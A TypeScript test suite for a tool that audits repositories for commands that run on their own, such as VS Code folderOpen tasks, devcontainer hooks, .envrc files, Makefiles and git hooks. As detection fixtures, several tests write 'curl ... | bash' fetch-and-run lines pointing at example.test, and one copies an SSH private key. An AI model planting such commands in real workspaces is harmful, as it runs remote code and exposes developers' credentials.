import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { auditWorkspace, parseJsonc } from '../src/workspace-audit.js'

function makeRepo(setup: (dir: string) => void): { dir: string; cleanup: () => void } {
  const dir = mkdtempSync(join(tmpdir(), 'depguard-ws-'))
  setup(dir)
  return {
    dir,
    cleanup: () => rmSync(dir, { recursive: true, force: true }),
  }
}

function withRepo(setup: (dir: string) => void, body: (dir: string) => void): void {
  const { dir, cleanup } = makeRepo(setup)
  try {
    body(dir)
  } finally {
    cleanup()
  }
}

describe('auditWorkspace — empty repo', () => {
  it('returns no findings and no surfaces checked', () => {
    withRepo(() => {}, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
      assert.equal(r.summary.high, 0)
      assert.equal(r.summary.warn, 0)
      assert.equal(r.summary.info, 0)
      assert.equal(r.surfacesChecked.length, 0)
      assert.equal(r.scannedPath, dir)
    })
  })
})

describe('auditWorkspace — VS Code tasks.json', () => {
  it('flags runOn:folderOpen with benign command as INFO', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), JSON.stringify({
        version: '2.0.0',
        tasks: [{
          label: 'watch',
          type: 'shell',
          command: 'npm',
          args: ['run', 'watch'],
          runOptions: { runOn: 'folderOpen' },
        }],
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      const f = r.findings[0]
      assert.equal(f.source, 'vscode-tasks')
      assert.equal(f.severity, 'INFO')
      assert.match(f.trigger, /folderOpen/)
      assert.match(f.command, /npm run watch/)
    })
  })

  it('flags runOn:folderOpen with curl|sh as HIGH', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), JSON.stringify({
        tasks: [{
          label: 'setup',
          type: 'shell',
          command: 'bash',
          args: ['-c', 'curl https://example.test/payload.sh | bash'],
          runOptions: { runOn: 'folderOpen' },
        }],
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
      assert.ok(r.findings[0].reasons.some(reason => /Pipes downloaded content/.test(reason)))
    })
  })

  it('ignores tasks without runOn:folderOpen', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), JSON.stringify({
        tasks: [
          { label: 'build', type: 'shell', command: 'tsc' },
          { label: 'manual', type: 'shell', command: 'curl https://example.test/x.sh | sh' },
        ],
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      // Surface is checked but no findings — those tasks require manual invocation
      assert.equal(r.surfacesChecked.includes('.vscode/tasks.json'), true)
      assert.equal(r.findings.length, 0)
    })
  })

  it('parses JSONC with comments and trailing commas', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), `{
        // VS Code tasks
        "version": "2.0.0",
        "tasks": [
          {
            "label": "auto", /* runs on open */
            "type": "shell",
            "command": "echo hello",
            "runOptions": { "runOn": "folderOpen" }, // trailing comma below
          },
        ],
      }`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'INFO')
    })
  })

  it('handles malformed JSON gracefully (no crash, no findings)', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), '{ not valid json }')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
      assert.ok(r.surfacesChecked.includes('.vscode/tasks.json'))
    })
  })

  it('escalates folderOpen task touching SSH keys to WARN', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), JSON.stringify({
        tasks: [{
          label: 'backup',
          type: 'shell',
          command: 'cp',
          args: ['~/.ssh/id_rsa', '/tmp/x'],
          runOptions: { runOn: 'folderOpen' },
        }],
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'WARN')
    })
  })
})

describe('auditWorkspace — VS Code settings.json', () => {
  it('flags terminal.integrated.automationProfile override as WARN', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/settings.json'), JSON.stringify({
        'terminal.integrated.automationProfile.linux': {
          path: './scripts/shim.sh',
          args: [],
        },
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].source, 'vscode-settings')
      assert.equal(r.findings[0].severity, 'WARN')
    })
  })

  it('flags python interpreter override pointing inside repo as WARN', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/settings.json'), JSON.stringify({
        'python.defaultInterpreterPath': '${workspaceFolder}/.venv/bin/python',
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'WARN')
    })
  })

  it('does not flag npm.packageManager when standard', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/settings.json'), JSON.stringify({
        'npm.packageManager': 'pnpm',
        'editor.tabSize': 2,
        'files.eol': '\n',
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
    })
  })

  it('supports nested object form of dotted settings', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/settings.json'), JSON.stringify({
        terminal: {
          integrated: {
            automationProfile: {
              linux: { path: '/usr/bin/bash', args: ['-l'] },
            },
          },
        },
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.ok(r.findings.length >= 1)
      assert.equal(r.findings[0].source, 'vscode-settings')
    })
  })
})

describe('auditWorkspace — devcontainer', () => {
  it('flags benign postCreateCommand as INFO', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.devcontainer'))
      writeFileSync(join(dir, '.devcontainer/devcontainer.json'), JSON.stringify({
        image: 'node:20',
        postCreateCommand: 'npm install',
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'INFO')
      assert.equal(r.findings[0].source, 'devcontainer')
    })
  })

  it('flags initializeCommand with host-execution note', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.devcontainer'))
      writeFileSync(join(dir, '.devcontainer/devcontainer.json'), JSON.stringify({
        image: 'node:20',
        initializeCommand: 'echo init',
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.match(r.findings[0].trigger, /initializeCommand/)
      assert.match(r.findings[0].trigger, /host machine/)
    })
  })

  it('flags postCreateCommand with curl|sh as HIGH', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.devcontainer'))
      writeFileSync(join(dir, '.devcontainer/devcontainer.json'), JSON.stringify({
        image: 'node:20',
        postCreateCommand: 'curl https://example.test/install.sh | bash',
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
    })
  })

  it('handles object form of lifecycle commands', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.devcontainer'))
      writeFileSync(join(dir, '.devcontainer/devcontainer.json'), JSON.stringify({
        postCreateCommand: {
          install: 'npm install',
          chmod: 'chmod +x ./run.sh',
        },
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      // Both entries should be detected; both INFO
      assert.equal(r.findings.length, 2)
      assert.ok(r.findings.every(f => f.severity === 'INFO'))
    })
  })

  it('handles array form of lifecycle commands', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.devcontainer'))
      writeFileSync(join(dir, '.devcontainer/devcontainer.json'), JSON.stringify({
        postCreateCommand: ['npm', 'install'],
      }))
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.match(r.findings[0].command, /npm install/)
    })
  })
})

describe('auditWorkspace — .envrc (direnv)', () => {
  it('flags pure-stdlib .envrc as INFO', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.envrc'), 'use flake\ndotenv\nPATH_add ./bin\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'INFO')
      assert.equal(r.findings[0].source, 'envrc')
    })
  })

  it('flags arbitrary shell .envrc as WARN even without attack patterns', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.envrc'), 'echo hello\nfor f in *.txt; do cat "$f"; done\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'WARN')
    })
  })

  it('flags .envrc with curl|sh as HIGH', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.envrc'), 'curl https://example.test/x.sh | bash')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
    })
  })

  it('ignores empty .envrc', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.envrc'), '\n# just a comment\n\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
      assert.ok(r.surfacesChecked.includes('.envrc'))
    })
  })
})

describe('auditWorkspace — JetBrains run configurations', () => {
  it('flags benign shell config as INFO', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.idea/runConfigurations'), { recursive: true })
      writeFileSync(join(dir, '.idea/runConfigurations/Run.xml'), `<component name="ProjectRunConfigurationManager">
  <configuration default="false" name="Build" type="ShConfigurationType">
    <option name="SCRIPT_TEXT" value="npm run build" />
    <option name="INTERPRETER_PATH" value="/bin/bash" />
  </configuration>
</component>`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].source, 'jetbrains-runconfig')
      assert.equal(r.findings[0].severity, 'INFO')
    })
  })

  it('flags JetBrains config with curl|sh as HIGH', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.idea/runConfigurations'), { recursive: true })
      writeFileSync(join(dir, '.idea/runConfigurations/Setup.xml'), `<component name="ProjectRunConfigurationManager">
  <configuration default="false" name="Setup" type="ShConfigurationType">
    <option name="SCRIPT_TEXT" value="curl https://example.test/x.sh | sh" />
  </configuration>
</component>`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
    })
  })

  it('decodes XML entities in command preview', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.idea/runConfigurations'), { recursive: true })
      writeFileSync(join(dir, '.idea/runConfigurations/X.xml'), `<component name="ProjectRunConfigurationManager">
  <configuration default="false" name="X" type="ShConfigurationType">
    <option name="SCRIPT_TEXT" value="echo &quot;hi&quot; &amp;&amp; ls" />
  </configuration>
</component>`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.match(r.findings[0].command, /echo "hi" && ls/)
    })
  })
})

describe('auditWorkspace — Makefile', () => {
  it('does NOT flag benign default target', () => {
    withRepo(dir => {
      writeFileSync(join(dir, 'Makefile'), `all: build test\n\nbuild:\n\ttsc\n\ntest:\n\tjest\n`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
      assert.ok(r.surfacesChecked.includes('Makefile'))
    })
  })

  it('flags Makefile default target with curl|sh as HIGH', () => {
    withRepo(dir => {
      writeFileSync(join(dir, 'Makefile'), `setup:\n\tcurl https://example.test/x.sh | bash\n`)
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
      assert.equal(r.findings[0].source, 'makefile')
    })
  })

  it('skips variable assignments and includes to find the first target', () => {
    withRepo(dir => {
      writeFileSync(join(dir, 'Makefile'), `CC = gcc
CFLAGS := -O2
include common.mk
.PHONY: all
all:
\t@echo benign
`)
    }, dir => {
      const r = auditWorkspace(dir)
      // benign — no findings
      assert.equal(r.findings.length, 0)
    })
  })
})

describe('auditWorkspace — .gitattributes', () => {
  it('does NOT flag git-lfs filter', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.gitattributes'), '*.bin filter=lfs diff=lfs merge=lfs -text\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
    })
  })

  it('flags custom filter as WARN', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.gitattributes'), '*.sec filter=decrypt diff=decrypt\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'WARN')
      assert.equal(r.findings[0].source, 'gitattributes')
    })
  })

  it('ignores comments and blank lines', () => {
    withRepo(dir => {
      writeFileSync(join(dir, '.gitattributes'), '# header\n\n* text=auto eol=lf\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
    })
  })
})

describe('auditWorkspace — committed git hooks', () => {
  it('flags committed pre-commit with classifier severity', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.githooks'))
      writeFileSync(join(dir, '.githooks/pre-commit'), '#!/bin/sh\nnpm run lint\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].source, 'githooks')
      assert.equal(r.findings[0].severity, 'INFO')
      assert.match(r.findings[0].reasons[0], /does NOT run automatically/)
    })
  })

  it('flags committed post-checkout with curl|sh as HIGH', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.githooks'))
      writeFileSync(join(dir, '.githooks/post-checkout'), '#!/bin/sh\ncurl https://example.test/x.sh | sh\n')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 1)
      assert.equal(r.findings[0].severity, 'HIGH')
    })
  })

  it('ignores files that are not known git hook names', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.githooks'))
      writeFileSync(join(dir, '.githooks/README.md'), 'docs')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.findings.length, 0)
    })
  })
})

describe('auditWorkspace — aggregation and ordering', () => {
  it('returns counts per severity', () => {
    withRepo(dir => {
      mkdirSync(join(dir, '.vscode'))
      writeFileSync(join(dir, '.vscode/tasks.json'), JSON.stringify({
        tasks: [
          { label: 'a', type: 'shell', command: 'npm run watch', runOptions: { runOn: 'folderOpen' } },
          { label: 'b', type: 'shell', command: 'bash', args: ['-c', 'curl https://example.test/x.sh | sh'], runOptions: { runOn: 'folderOpen' } },
        ],
      }))
      writeFileSync(join(dir, '.envrc'), 'echo arbitrary shell')
    }, dir => {
      const r = auditWorkspace(dir)
      assert.equal(r.summary.high, 1)
      assert.equal(r.summary.warn, 1)
      assert.equal(r.summary.info, 1)
      assert.equal(r.findings.length, 3)
      // HIGH must come first
      assert.equal(r.findings[0].severity, 'HIGH')
    })
  })

  it('always includes the note field', () => {
    withRepo(() => {}, dir => {
      const r = auditWorkspace(dir)
      assert.ok(r.note.length > 0)
      assert.match(r.note, /Pre-open audit/)
    })
  })
})

describe('parseJsonc', () => {
  it('parses plain JSON', () => {
    assert.deepEqual(parseJsonc('{"a": 1}'), { a: 1 })
  })

  it('strips line comments', () => {
    assert.deepEqual(parseJsonc('{// hi\n"a": 1}'), { a: 1 })
  })

  it('strips block comments', () => {
    assert.deepEqual(parseJsonc('{/* hi */ "a": 1}'), { a: 1 })
  })

  it('strips trailing commas', () => {
    assert.deepEqual(parseJsonc('{"a": 1,}'), { a: 1 })
  })

  it('preserves URLs inside strings', () => {
    assert.deepEqual(parseJsonc('{"url": "https://example.test/path"}'), { url: 'https://example.test/path' })
  })

  it('returns null on malformed input', () => {
    assert.equal(parseJsonc('{not json}'), null)
  })
})
